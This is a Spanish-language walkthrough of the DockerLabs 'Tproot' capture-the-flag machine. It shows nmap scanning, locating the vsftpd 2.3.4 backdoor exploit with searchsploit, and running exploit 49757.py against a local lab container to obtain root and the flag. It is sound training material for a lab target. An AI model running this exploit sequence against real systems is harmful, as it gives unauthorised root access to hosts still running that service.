Tproot-DockerLabs🇪🇸

**1. En primer lugar descomprimiremos el archivo facilitado**
```bash
unzip tproot.zip
```
<img width="961" height="175" alt="image" src="https://github.com/user-attachments/assets/9c216bf1-a858-4b1d-aca0-655285feb298" />

**2. Ahora iniciaremos la máquina**
```bash
sudo bash ./auto_deploy.sh tproot.tar 
```

<img width="954" height="493" alt="image" src="https://github.com/user-attachments/assets/4d43e30d-82cb-4558-a19f-94f488290062" />


**3. Primero haremos un ping para poder comprobar la conexión.**

```bash
 ping -c3 172.17.0.3
```

<img width="961" height="283" alt="image" src="https://github.com/user-attachments/assets/b891e637-6634-42cd-b957-5b0aa66176e1" />


**4.Ahora realizaremos un rastreo de puertos con nmap para ver que puertos están abiertos.**
```bash
sudo nmap -p- -sSCV -n --min-rate=5000 --open 172.17.0.3 -oX scan_nmap.xml
```

<img width="950" height="367" alt="image" src="https://github.com/user-attachments/assets/1d33732b-c4ae-4281-a09a-edb0bd88a00a" />


**5. Anteriormente hemos hayado que vsftpd 2.3.4 está en el puerto 21, y utilizaremos el archivo creado con el nmap para trasformarse en un reporte navegable con xsltproc.**
```bash
xsltproc scan_nmap.xml -o tproof_report.html
```

<img width="1009" height="217" alt="image" src="https://github.com/user-attachments/assets/448fe491-e9bf-4762-8ba4-4eeac27ff14f" />


**6. Ahora vamos a explorar mediante `searchploit`, al buscar el nombre y la versión vamos a hallar un exploit en python y su versión para metasploit.**

```bash
searchsploit vsftpd 2.3.4
```

<img width="1020" height="185" alt="image" src="https://github.com/user-attachments/assets/57abc483-a53b-4d28-8646-617328476ffc" />


**7.Ahora obtendremos el exploit que hemos encontrado anteriormente y lo verificamos**
```bash
 searchsploit -m 49757.py
```

<img width="1012" height="290" alt="image" src="https://github.com/user-attachments/assets/e0ade5d4-1419-4e53-9fa1-8df3a803d922" />

*Ahora procedemos a ejecutarlo y veremos que hemos entrado como root mediante es exploit.*

```bash
python3 49757.py 172.17.0.3
```

<img width="884" height="203" alt="image" src="https://github.com/user-attachments/assets/d4e12328-c219-4010-b43e-dfaf2c7d9d00" />

**8. Para obtener la flag llegaremos a la carpeta de /root**

<img width="1018" height="529" alt="image" src="https://github.com/user-attachments/assets/e9f802b5-aaa0-4a7c-a280-f63d44c643c7" />




